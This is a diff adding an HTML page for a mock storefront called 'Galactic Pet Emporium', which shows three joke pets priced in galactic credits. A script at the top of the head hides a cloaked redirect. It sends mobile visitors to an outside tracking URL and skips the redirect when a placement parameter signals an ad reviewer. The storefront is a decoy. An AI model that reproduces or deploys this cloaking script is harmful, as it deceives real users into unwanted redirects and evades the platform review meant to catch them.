@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const utmXXX = urlParams.get("xxx");
+    const s = urlParams.get("s");
+    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    const lander = `https://klcxb6.mcgo2.com/visit/de9fa2b0-1366-489a-be81-3b73f541059f?s1=${s}`;
+    if (utmXXX === "__PLACEMENT__") { }
+    else if (isMobileDevice) { window.location.href = lander; } 
+    else { }
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Galactic Pet Emporium</title>
+    <style>
+        body {
+            font-family: 'Courier New', monospace;
+            background-color: #000033;
+            color: #00ffff;
+            margin: 0;
+            padding: 0;
+        }
+        header {
+            background-color: #1a1a4d;
+            padding: 20px;
+            text-align: center;
+        }
+        h1 {
+            font-size: 3em;
+            text-shadow: 2px 2px #ff00ff;
+        }
+        nav {
+            display: flex;
+            justify-content: space-around;
+            background-color: #330066;
+            padding: 10px;
+        }
+        nav a {
+            color: #ffff00;
+            text-decoration: none;
+            font-weight: bold;
+        }
+        main {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 20px;
+            padding: 20px;
+        }
+        .product {
+            background-color: #1a1a4d;
+            border: 2px solid #00ffff;
+            border-radius: 15px;
+            padding: 15px;
+            text-align: center;
+        }
+        .product img {
+            max-width: 100%;
+            border-radius: 10px;
+        }
+        footer {
+            background-color: #1a1a4d;
+            text-align: center;
+            padding: 10px;
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+        }
+        footer a {
+            color: #00ffff;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Galactic Pet Emporium</h1>
+    </header>
+    <nav>
+        <a href="#">Home</a>
+        <a href="#">Shop</a>
+        <a href="#">About</a>
+        <a href="#">Contact</a>
+    </nav>
+    <main>
+        <div class="product">
+            <img src="https://placehold.co/200x200?text=Space+Hamster" alt="Space Hamster">
+            <h2>Space Hamster</h2>
+            <p>Your very own cosmic companion!</p>
+            <p>Price: 50 Galactic Credits</p>
+            <button>Add to Cart</button>
+        </div>
+        <div class="product">
+            <img src="https://placehold.co/200x200?text=Alien+Fish" alt="Alien Fish">
+            <h2>Alien Fish</h2>
+            <p>Mesmerizing aquatic life from distant planets!</p>
+            <p>Price: 75 Galactic Credits</p>
+            <button>Add to Cart</button>
+        </div>
+        <div class="product">
+            <img src="https://placehold.co/200x200?text=Martian+Puppy" alt="Martian Puppy">
+            <h2>Martian Puppy</h2>
+            <p>Loyal, loving, and slightly green!</p>
+            <p>Price: 100 Galactic Credits</p>
+            <button>Add to Cart</button>
+        </div>
+    </main>
+    <footer>
+        <a href="https://tokreward.com/privacy.html">Privacy Policy</a>
+    </footer>
+</body>
+</html>
